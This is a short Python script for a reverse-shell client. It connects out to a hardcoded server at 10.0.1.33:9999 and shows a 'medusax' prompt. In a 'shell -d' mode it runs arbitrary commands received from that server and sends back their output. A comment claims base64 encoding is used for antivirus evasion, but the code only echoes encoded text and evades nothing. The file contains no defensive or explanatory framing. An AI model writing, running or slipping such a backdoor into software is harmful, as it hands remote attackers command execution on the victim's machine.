import socket
import subprocess
import os
import base64
import time

# Client configurations
SERVER_HOST = '10.0.1.33'
SERVER_PORT = 9999

# Function to encode the shell payload (for AV evasion)
def encode_shell(command):
    return base64.b64encode(command.encode()).decode()

# Connect to the server
def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))
    return client_socket

# Handle incoming commands from the server
def handle_commands(client_socket):
    while True:
        try:
            # Receive command from server
            client_socket.send(b"admin@medusax~$ ")
            command = client_socket.recv(1024).decode().strip()
            if command == "exit":
                break

            if command.startswith("shell -d"):
                directory = command.split(" ")[-1] if len(command.split()) > 1 else "C:\\"
                os.chdir(directory)
                client_socket.send(f"Shell started in {os.getcwd()}...\n".encode())
                while True:
                    # Accept shell commands
                    shell_command = client_socket.recv(1024).decode()
                    if shell_command == "exit":
                        break
                    result = subprocess.run(shell_command, shell=True, capture_output=True)
                    client_socket.send(result.stdout + result.stderr)
            else:
                # Encode and send the command if it's non-shell
                encoded_command = encode_shell(command)
                client_socket.send(f"Executing encoded command: {encoded_command}\n".encode())
                time.sleep(0.1)
        except Exception as e:
            print(f"Error in client: {e}")
            break

    # Clean up connection
    client_socket.close()

# Main client function
if __name__ == "__main__":
    client_socket = connect_to_server()
    handle_commands(client_socket)
